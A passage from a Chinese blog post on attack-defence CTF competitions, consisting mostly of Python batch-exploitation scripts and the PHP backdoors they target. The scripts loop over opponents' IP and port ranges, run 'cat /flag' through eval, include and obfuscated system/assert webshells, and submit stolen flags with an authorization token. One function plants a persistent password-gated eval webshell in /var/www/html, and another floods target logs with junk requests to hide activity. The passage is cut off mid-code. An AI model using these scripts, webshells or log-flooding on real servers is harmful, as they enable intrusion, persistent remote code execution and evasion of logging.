function">upload_pony</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        <span class="token comment" spellcheck="true"># 木马文件路径,例如： include/shell.php 最开始不加 /</span>        payload_address <span class="token operator">=</span> <span class="token string">""</span>        url_shell <span class="token operator">=</span> url <span class="token operator">+</span> payload_address        <span class="token comment" spellcheck="true"># post</span>        data <span class="token operator">=</span> <span class="token punctuation">{</span>            <span class="token string">"passwd"</span><span class="token punctuation">:</span> <span class="token string">"atmujie"</span><span class="token punctuation">,</span>  <span class="token comment" spellcheck="true"># 密码验证</span>            <span class="token string">"cmd"</span><span class="token punctuation">:</span> <span class="token string">"file_put_contents('/var/www/html/log.php','&lt;?php if(md5($_POST[passwd])===\"7ac0852c4c3cfff535d3c746a9064daf\"){@eval($_POST[cmd]);}');"</span>            <span class="token comment" spellcheck="true"># 攻击执行</span>        <span class="token punctuation">}</span>        requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url_shell<span class="token punctuation">,</span> data<span class="token punctuation">)</span>        <span class="token comment" spellcheck="true">## get</span>        <span class="token comment" spellcheck="true"># requests.get(url_shell+"?s=payload")</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"上传小马执行完成，自行检查是否成功"</span><span class="token punctuation">)</span>    <span class="token keyword">except</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"上传失败"</span><span class="token punctuation">)</span>        <span class="token keyword">pass</span><span class="token comment" spellcheck="true"># 主函数</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        <span class="token comment" spellcheck="true"># 指定端口范围</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token comment" spellcheck="true"># 跳过自己的靶机</span>            <span class="token keyword">if</span> i <span class="token operator">==</span> <span class="token number">111</span><span class="token punctuation">:</span>                <span class="token keyword">continue</span>            url <span class="token operator">=</span> <span class="token string">"http://1.15.224.114:{}/"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>i<span class="token punctuation">)</span>            <span class="token comment" spellcheck="true">################# 函数调用区域 ################</span>            <span class="token comment" spellcheck="true">##############################################</span>    <span class="token keyword">except</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"主函数未知错误"</span><span class="token punctuation">)</span>        <span class="token keyword">pass</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="awd漏洞利用"><a href="#awd漏洞利用" class="headerlink" title="awd漏洞利用"></a>awd漏洞利用</h3><p>D盾扫描</p><p><img src="image-20211122111534707.png" alt="image-20211122111534707"></p><h4 id="eval函数-get-post直接利用"><a href="#eval函数-get-post直接利用" class="headerlink" title="eval函数 get/post直接利用"></a>eval函数 get/post直接利用</h4><h5 id="awdhtml-fwma-php"><a href="#awdhtml-fwma-php" class="headerlink" title="awdhtml/.fwma.php"></a>awdhtml/.fwma.php</h5><p><img src="image-20211122111745996.png" alt="image-20211122111745996"></p><p>简单的一句话利用</p><h6 id="批量化"><a href="#批量化" class="headerlink" title="批量化"></a>批量化</h6><p>写好了函数，直接拼积木就可以用了，这里以.fwma.php 为例</p><blockquote><p>eval() get/post直接提交flag</p></blockquote><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> base64<span class="token keyword">import</span> os<span class="token keyword">import</span> re<span class="token keyword">import</span> random<span class="token keyword">import</span> requests<span class="token comment" spellcheck="true"># TODO 获取flag ,漏洞利用函数 调用： flag = attack(url)</span><span class="token comment" spellcheck="true"># 此函数是以正常一句话马获取flag</span><span class="token keyword">def</span> <span class="token function">attack</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        <span class="token comment" spellcheck="true"># 木马文件路径,例如： include/shell.php 最开始不加 /</span>        payload_address <span class="token operator">=</span> <span class="token string">".fwma.php"</span>        <span class="token comment" spellcheck="true"># post</span>        data <span class="token operator">=</span> <span class="token punctuation">{</span>            <span class="token string">"fwfwfwfwfw"</span><span class="token punctuation">:</span> <span class="token string">"system('cat /flag');"</span>  <span class="token comment" spellcheck="true"># 攻击执行</span>        <span class="token punctuation">}</span>        <span class="token comment" spellcheck="true"># get</span>        posix <span class="token operator">=</span> <span class="token punctuation">{</span>            <span class="token string">""</span><span class="token punctuation">:</span> <span class="token string">""</span>  <span class="token comment" spellcheck="true"># get传参</span>        <span class="token punctuation">}</span>        url_shell <span class="token operator">=</span> url <span class="token operator">+</span> payload_address        shell_res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url_shell<span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token punctuation">.</span>text <span class="token comment" spellcheck="true"># 这是post请求</span>        <span class="token comment" spellcheck="true"># shell_res = requests.get(url_shell, posix).text # 这是get请求</span>        flag_text <span class="token operator">=</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string">'{.*?}'</span><span class="token punctuation">,</span> shell_res<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>        <span class="token keyword">return</span> <span class="token string">"flag"</span> <span class="token operator">+</span> flag_text    <span class="token keyword">except</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"flag获取失败"</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token number">0</span>        <span class="token keyword">pass</span><span class="token comment" spellcheck="true"># TODO 提交flag函数, 需要抓包查看提交的地址，稳妥 调用： submit_flag(flag, url)</span><span class="token comment" spellcheck="true"># 需要修改 submit_url data header 位置</span><span class="token keyword">def</span> <span class="token function">submit_flag</span><span class="token punctuation">(</span>flag<span class="token punctuation">,</span> url<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        submit_url <span class="token operator">=</span> <span class="token string">"http://172.17.135.26:19999/api/flag"</span>    <span class="token comment" spellcheck="true"># 这里写抓包得到的提交地址,最前面不需要加 /</span>        data <span class="token operator">=</span> <span class="token punctuation">{</span>  <span class="token comment" spellcheck="true"># flag</span>            <span class="token string">"flag"</span><span class="token punctuation">:</span> <span class="token string">"{}"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>flag<span class="token punctuation">)</span>        <span class="token punctuation">}</span>        header <span class="token operator">=</span> <span class="token punctuation">{</span>  <span class="token comment" spellcheck="true"># token</span>            <span class="token string">"Authorization"</span><span class="token punctuation">:</span> <span class="token string">"320ca217aab29b1a789e5f5e81bc9ec3"</span>        <span class="token punctuation">}</span>        proxy <span class="token operator">=</span> <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">#"http": "http://localhost:8080"  # 使用代理，方便抓包，可以不用</span>        <span class="token punctuation">}</span>        <span class="token comment" spellcheck="true">#######  以下无需修改</span>        res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>submit_url<span class="token punctuation">,</span> headers<span class="token operator">=</span>header<span class="token punctuation">,</span> json<span class="token operator">=</span>data<span class="token punctuation">,</span> proxies<span class="token operator">=</span>proxy<span class="token punctuation">)</span><span class="token punctuation">.</span>text        <span class="token keyword">print</span><span class="token punctuation">(</span>url <span class="token operator">+</span> <span class="token string">"[+]"</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span>    <span class="token keyword">except</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>url <span class="token operator">+</span> <span class="token string">"[-]flag提交函数未知错误"</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># TODO 脏数据,用于恶心日志文件 调用：dirty_data(url)</span><span class="token comment" spellcheck="true"># 该函数已封装完毕，无需任何修改</span><span class="token comment" spellcheck="true"># 传入flag和题目靶机首地址，例如 http://172.17.135.26:10016/</span><span class="token keyword">def</span> <span class="token function">dirty_data</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        data <span class="token operator">=</span> <span class="token punctuation">{</span>            <span class="token string">"cmd"</span><span class="token punctuation">:</span> <span class="token string">"system('cat /flag');"</span>        <span class="token punctuation">}</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">200</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            s0 <span class="token operator">=</span> chr<span class="token punctuation">(</span>int<span class="token punctuation">(</span>random<span class="token punctuation">.</span>uniform<span class="token punctuation">(</span><span class="token number">97</span><span class="token punctuation">,</span> <span class="token number">122</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            s1 <span class="token operator">=</span> chr<span class="token punctuation">(</span>int<span class="token punctuation">(</span>random<span class="token punctuation">.</span>uniform<span class="token punctuation">(</span><span class="token number">97</span><span class="token punctuation">,</span> <span class="token number">122</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            s2 <span class="token operator">=</span> chr<span class="token punctuation">(</span>int<span class="token punctuation">(</span>random<span class="token punctuation">.</span>uniform<span class="token punctuation">(</span><span class="token number">97</span><span class="token punctuation">,</span> <span class="token number">122</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            s3 <span class="token operator">=</span> chr<span class="token punctuation">(</span>int<span class="token punctuation">(</span>random<span class="token punctuation">.</span>uniform<span class="token punctuation">(</span><span class="token number">97</span><span class="token punctuation">,</span> <span class="token number">122</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            s4 <span class="token operator">=</span> chr<span class="token punctuation">(</span>int<span class="token punctuation">(</span>random<span class="token punctuation">.</span>uniform<span class="token punctuation">(</span><span class="token number">97</span><span class="token punctuation">,</span> <span class="token number">122</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token comment" spellcheck="true"># 生成脏链接</span>            url_dirty <span class="token operator">=</span> url <span class="token operator">+</span> <span class="token string">"?"</span> <span class="token operator">+</span> s0 <span class="token operator">+</span> <span class="token string">"="</span> <span class="token operator">+</span> s1 <span class="token operator">+</span> s2 <span class="token operator">+</span> s3 <span class="token operator">+</span> s4            <span class="token comment" spellcheck="true"># print(url_dirty)</span>            requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url_dirty<span class="token punctuation">,</span> data<span class="token punctuation">)</span>    <span class="token keyword">except</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"第"</span> <span class="token operator">+</span> i <span class="token operator">+</span> <span class="token string">"条脏数据上传失败"</span><span class="token punctuation">)</span>        <span class="token keyword">pass</span><span class="token comment" spellcheck="true"># 主函数</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        <span class="token comment" spellcheck="true"># 指定端口范围</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">8001</span><span class="token punctuation">,</span> <span class="token number">8011</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token comment" spellcheck="true"># 跳过自己的靶机</span>            <span class="token keyword">if</span> i <span class="token operator">==</span> <span class="token number">8001</span><span class="token punctuation">:</span>                <span class="token keyword">continue</span>            url <span class="token operator">=</span> <span class="token string">"http://172.17.135.39:{}/"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>i<span class="token punctuation">)</span>            <span class="token comment" spellcheck="true">################# 函数调用区域 ################</span>            flag <span class="token operator">=</span> attack<span class="token punctuation">(</span>url<span class="token punctuation">)</span>            <span class="token comment" spellcheck="true"># print(flag)</span>            submit_flag<span class="token punctuation">(</span>flag<span class="token punctuation">,</span> url<span class="token punctuation">)</span>            <span class="token comment" spellcheck="true"># dirty_data(url)</span>            <span class="token comment" spellcheck="true">##############################################</span>    <span class="token keyword">except</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"主函数未知错误"</span><span class="token punctuation">)</span>        <span class="token keyword">pass</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="awdhtml-config-php"><a href="#awdhtml-config-php" class="headerlink" title="awdhtml/config.php"></a>awdhtml/config.php</h5><p><img src="image-20211122211547836.png" alt="image-20211122211547836"></p><p>利用方式和.fwma.php一致，改个路径就行</p><h6 id="批量化-1"><a href="#批量化-1" class="headerlink" title="批量化"></a>批量化</h6><p><img src="image-20211122213655555.png" alt="image-20211122213655555"></p><h5 id="awdhtml-index-php"><a href="#awdhtml-index-php" class="headerlink" title="awdhtml/index.php"></a>awdhtml/index.php</h5><p><img src="C:\Users\MuJie\AppData\Roaming\Typora\typora-user-images\image-20211122213929910.png" alt="image-20211122213929910"></p><p>利用方式同上,修改路径即可</p><p>值得一提的是因为index.php文件很多，正则不容易匹配到flag，这里我将匹配规则改为了-1</p><h6 id="批量化-2"><a href="#批量化-2" class="headerlink" title="批量化"></a>批量化</h6><p><img src="image-20211122214629377.png" alt="image-20211122214629377"></p><h4 id="include文件包含"><a href="#include文件包含" class="headerlink" title="include文件包含"></a>include文件包含</h4><h5 id="awdhtml-404-php"><a href="#awdhtml-404-php" class="headerlink" title="awdhtml/404.php"></a>awdhtml/404.php</h5><p><img src="image-20211122201121674.png" alt="image-20211122201121674"></p><p>文件包含，这里改一下上面脚本的提交函数就行</p><h6 id="批量化-3"><a href="#批量化-3" class="headerlink" title="批量化"></a>批量化</h6><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># TODO 获取flag ,漏洞利用函数 调用： flag = attack(url)</span><span class="token comment" spellcheck="true"># 此函数运行需要修改 payload_address data/posix并设置get/post传参</span><span class="token comment" spellcheck="true"># 此函数是以正常一句话马/文件包含马等可以简易利用的漏洞获取flag</span><span class="token keyword">def</span> <span class="token function">attack</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        <span class="token comment" spellcheck="true"># 木马文件路径,例如： include/shell.php 最开始不加 /</span>        payload_address <span class="token operator">=</span> <span class="token string">"404.php"</span>        <span class="token comment" spellcheck="true"># post</span>        data <span class="token operator">=</span> <span class="token punctuation">{</span>            <span class="token string">""</span><span class="token punctuation">:</span> <span class="token string">"system('cat /flag');"</span>  <span class="token comment" spellcheck="true"># 攻击执行</span>        <span class="token punctuation">}</span>        <span class="token comment" spellcheck="true"># get</span>        params <span class="token operator">=</span> <span class="token punctuation">{</span>            <span class="token string">"file"</span><span class="token punctuation">:</span> <span class="token string">"/flag"</span>  <span class="token comment" spellcheck="true"># get传参</span>        <span class="token punctuation">}</span>        url_shell <span class="token operator">=</span> url <span class="token operator">+</span> payload_address        <span class="token comment" spellcheck="true"># shell_res = requests.post(url_shell, data).text  # 这是post请求</span>        shell_res <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url_shell<span class="token punctuation">,</span> params<span class="token operator">=</span>params<span class="token punctuation">)</span><span class="token punctuation">.</span>text  <span class="token comment" spellcheck="true"># 这是get请求</span>        flag_text <span class="token operator">=</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string">'{.*?}'</span><span class="token punctuation">,</span> shell_res<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>        <span class="token keyword">return</span> <span class="token string">"flag"</span> <span class="token operator">+</span> flag_text    <span class="token keyword">except</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"flag获取失败"</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token number">0</span>        <span class="token keyword">pass</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="改利用代码，不容易直接看出利用方式的洞"><a href="#改利用代码，不容易直接看出利用方式的洞" class="headerlink" title="改利用代码，不容易直接看出利用方式的洞"></a>改利用代码，不容易直接看出利用方式的洞</h4><h5 id="awdhtml-xyhai-php"><a href="#awdhtml-xyhai-php" class="headerlink" title="awdhtml/xyhai.php"></a>awdhtml/xyhai.php</h5><p>这个漏洞比较麻烦</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> <span class="token keyword">class</span> <span class="token class-name">YPNX</span> <span class="token punctuation">{</span>     <span class="token keyword">function</span> <span class="token function">xRNA</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$dorK</span> <span class="token operator">=</span> <span class="token string">"\x14"</span> <span class="token operator">^</span> <span class="token string">"\x75"</span><span class="token punctuation">;</span>        <span class="token variable">$xLGK</span> <span class="token operator">=</span> <span class="token string">"\xc5"</span> <span class="token operator">^</span> <span class="token string">"\xb6"</span><span class="token punctuation">;</span>        <span class="token variable">$aIAV</span> <span class="token operator">=</span> <span class="token string">"\x1"</span> <span class="token operator">^</span> <span class="token string">"\x72"</span><span class="token punctuation">;</span>        <span class="token variable">$PCWV</span> <span class="token operator">=</span> <span class="token string">"\x8d"</span> <span class="token operator">^</span> <span class="token string">"\xe8"</span><span class="token punctuation">;</span>        <span class="token variable">$tEMp</span> <span class="token operator">=</span> <span class="token string">"\x96"</span> <span class="token operator">^</span> <span class="token string">"\xe4"</span><span class="token punctuation">;</span>        <span class="token variable">$eUdm</span> <span class="token operator">=</span> <span class="token string">"\x21"</span> <span class="token operator">^</span> <span class="token string">"\x55"</span><span class="token punctuation">;</span>        <span class="token variable">$TFYi</span> <span class="token operator">=</span><span class="token variable">$dorK</span><span class="token punctuation">.</span><span class="token variable">$xLGK</span><span class="token punctuation">.</span><span class="token variable">$aIAV</span><span class="token punctuation">.</span><span class="token variable">$PCWV</span><span class="token punctuation">.</span><span class="token variable">$tEMp</span><span class="token punctuation">.</span><span class="token variable">$eUdm</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token variable">$TFYi</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$uNHI</span><span class="token operator">=</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">xRNA</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        @<span class="token variable">$uNHI</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">fR</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">$ypnx</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">YPNX</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//@$ypnx->fR = isset($_GET['id'])?base64_decode($_POST['pwd']):$_POST['pwd'];</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>先拿他的异或跑一下</p><p><img src="image-20211122220203007.png" alt="image-20211122220203007"></p><p>断言，那和eval就是一个用法</p><p>直接利用没有成功，于是我在本地起了一个环境，发现访问url为<code>http://localhost/awdhtml/xyhai.php?s=/Login/index</code></p><p>接下来payload构造就和.fwma.php一致了</p><h6 id="批量化-4"><a href="#批量化-4" class="headerlink" title="批量化"></a>批量化</h6><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># TODO 获取flag ,漏洞利用函数 调用： flag = attack(url)</span><span class="token comment" spellcheck="true"># 此函数运行需要修改 payload_address data/posix并设置get/post传参</span><span class="token comment" spellcheck="true"># 此函数是以正常一句话马获取flag</span><span class="token keyword">def</span> <span class="token function">attack</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        <span class="token comment" spellcheck="true"># 木马文件路径,例如： include/shell.php 最开始不加 /</span>        payload_address <span class="token operator">=</span> <span class="token string">"xyhai.php?s=/Login/index&amp;id=1111"</span>        <span class="token comment" spellcheck="true"># post</span>        data <span class="token operator">=</span> <span class="token punctuation">{</span>            <span class="token string">"pwd"</span><span class="token punctuation">:</span> <span class="token string">"c3lzdGVtKCJjYXQgL2ZsYWciKTs="</span>  <span class="token comment" spellcheck="true"># 攻击执行</span>        <span class="token punctuation">}</span>        <span class="token comment" spellcheck="true"># get</span>        params <span class="token operator">=</span> <span class="token punctuation">{</span>            <span class="token string">"id"</span><span class="token punctuation">:</span> <span class="token string">"1"</span>  <span class="token comment" spellcheck="true"># get传参</span>        <span class="token punctuation">}</span>        url_shell <span class="token operator">=</span> url <span class="token operator">+</span> payload_address        shell_res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url_shell<span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token punctuation">.</span>text  <span class="token comment" spellcheck="true"># 这是post请求</span>        <span class="token comment" spellcheck="true"># shell_res = requests.get(url_shell, params=params).text  # 这是get请求</span>        flag_text <span class="token operator">=</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string">'flag{.*?}'</span><span class="token punctuation">,</span> shell_res<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>flag_text<span class="token punctuation">)</span>        <span class="token keyword">return</span> flag_text    <span class="token keyword">except</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"flag获取失败"</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token number">0</span>        <span class="token keyword">pass</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="awdhtml-App-Mobile-Controller-wtf-php"><a href="#awdhtml-App-Mobile-Controller-wtf-php" class="headerlink" title="awdhtml/App/Mobile/Controller/wtf.php"></a>awdhtml/App/Mobile/Controller/wtf.php</h5><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> <span class="token variable">$file</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token string">"s"</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span class="token delimiter">&lt;?php</span> <span class="token variable">$config</span><span class="token operator">=</span><span class="token string">"s..y..s..t..e..m"</span><span class="token punctuation">;</span> <span class="token variable">$config</span><span class="token operator">=</span><span class="token function">implode</span><span class="token punctuation">(</span><span class="token function">explode</span><span class="token punctuation">(</span><span class="token string">".."</span><span class="token punctuation">,</span><span class="token variable">$config</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter">?></span><span class="token delimiter">&lt;?php</span> <span class="token comment" spellcheck="true">//$config($file); ?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>传入file，将s..y..s..t..e..m以..为分割转为数组在拼接，相当于$config=system,所以直接用，同样改一下初始的脚本就行</p><p>注意后面拼接了s，需要加上 || 绕过</p><h6 id="批量化-5"><a href="#批量化-5" class="headerlink" title="批量化"></a>批量化</h6><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># TODO 获取flag ,漏洞利用函数 调用： flag = attack(url)</span><span class="token comment" spellcheck="true"># 此函数运行需要修改 payload_address data/posix并设置get/post传参</span><span class="token comment" spellcheck="true"># 此函数是以正常一句话马获取flag</span><span class="token keyword">def</span> <span class="token function">attack</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        <span class="token comment" spellcheck="true"># 木马文件路径,例如： include/shell.php 最开始不加 /</span>        payload_address <span class="token operator">=</span> <span class="token string">"App/Mobile/Controller/wtf.php"</span>        <span class="token comment" spellcheck="true"># post</span>        data <span class="token operator">=</span> <span class="token punctuation">{</span>            <span class="token string">"file"</span><span class="token punctuation">:</span> <span class="token string">"cat /flag ||"</span>  <span class="token comment" spellcheck="true"># 攻击执行</span>        <span class="token punctuation">}</span>        <span class="token comment" spellcheck="true"># get</span>        params <span class="token operator">=</span> <span class="token punctuation">{</span>            <span class="token string">""</span><span class="token punctuation">:</span> <span class="token string">""</span>  <span class="token comment" spellcheck="true"># get传参</span>        <span class="token punctuation">}</span>        url_shell <span class="token operator">=</span> url <span class="token operator">+</span> payload_address        shell_res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url_shell<span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token punctuation">.</span>text  <span class="token comment" spellcheck="true"># 这是post请求</span>        <span class="token comment" spellcheck="true"># shell_res = requests.get(url_shell, params=params).text  # 这是get请求</span>        flag_text <span class="token operator">=</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string">'flag{.*?}'</span><span class="token punctuation">,</span> shell_res<span class="token punctuation">)</span>        flages <span class="token operator">=</span> str<span class="token punctuation">(</span>flag_text<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">]</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>flages<span class="token punctuation">)</span>        <span class="token keyword">return</span> flages    <span class="token keyword">except</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"flag获取失败"</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token number">0</span>        <span class="token keyword">pass</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>很奇怪，之前我一直是正则后用[0]转字符串，但这里报错数组越界，输出正常，所以我把获取flag的最后改成了这样，有一说一，我不理解</p><h5 id="awdhtml-App-Runtime-Data-css-php"><a href="#awdhtml-App-Runtime-Data-css-php" class="headerlink" title="awdhtml/App/Runtime/Data/.css.php"></a>awdhtml/App/Runtime/Data/.css.php</h5><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$setting</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'setting'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">Config</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$config</span> <span class="token operator">=</span> <span class="token string">"r|x|r|s|d|l"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token 